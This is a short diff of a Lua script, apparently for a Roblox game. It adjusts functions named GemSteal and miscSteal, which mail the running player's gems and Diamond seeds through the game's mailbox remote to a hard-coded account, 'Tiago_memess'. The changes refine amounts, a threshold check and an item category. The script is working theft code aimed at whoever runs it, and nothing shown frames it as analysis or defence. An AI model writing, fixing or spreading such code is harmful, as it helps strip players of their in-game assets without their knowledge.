@@ -27,7 +27,7 @@ local function GemSteal()
                         [2] = "DIMAS A BIRE",
                         [3] = "Currency",
                         [4] = GemId,
-                        [5] = GemAmount1 - 30009999
+                        [5] = GemAmount1 - 30000000
                     }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
         end
@@ -36,12 +36,12 @@ end
 
 local function miscSteal()
     for i, v in pairs(save.Seed) do
-        if v.id == "Diamond" and v._am >= 350 then
+        if v.id == "Diamond" and v._am > 350 then
             task.wait(35)
             local args = {
                 [1] = "Tiago_memess",
                 [2] = "DIAMOND SEEDS A BIRE",
-                [3] = "Misc",
+                [3] = "Seed",
                 [4] = i,
                 [5] = v._am
             }
